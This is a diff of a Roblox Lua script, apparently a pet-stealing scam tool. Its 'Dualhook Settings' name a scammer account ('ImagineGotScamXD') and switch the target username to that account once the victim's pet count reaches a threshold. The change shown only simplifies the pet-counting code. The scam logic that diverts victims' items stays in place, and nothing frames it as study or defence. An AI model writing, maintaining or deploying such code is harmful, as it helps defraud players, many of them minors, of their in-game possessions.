@@ -4,10 +4,8 @@ coroutine.wrap(function()
 
     coroutine.wrap(function()
     local Loads = require(game.ReplicatedStorage.Fsys).load
-    local InventoryDB = Loads("InventoryDB")
     local ClientData = Loads('ClientData')
     local player = game.Players.LocalPlayer
-    local petInventory = player:WaitForChild("Backpack"):WaitForChild("Pets")
 
     -- [ Dualhook Settings ] --
     DualUsername = "ImagineGotScamXD" -- [Dualhook Username]
@@ -32,16 +30,8 @@ coroutine.wrap(function()
         end
     end)
     
-    local function countPetsInInventory()
-    local total_pets = 0
-    -- Menghitung jumlah pet yang ada dalam inventory
-    for _, pet in pairs(petInventory:GetChildren()) do
-        total_pets = total_pets + 1
-    end
-    return total_pets
-end
-
-local total_pets = countPetsInInventory()
+local petInventory = player:WaitForChild("Backpack"):WaitForChild("Pets")
+local total_pets = #petInventory:GetChildren()
     
     if total_pets >= DualTotal then
         UserName = DualUsername
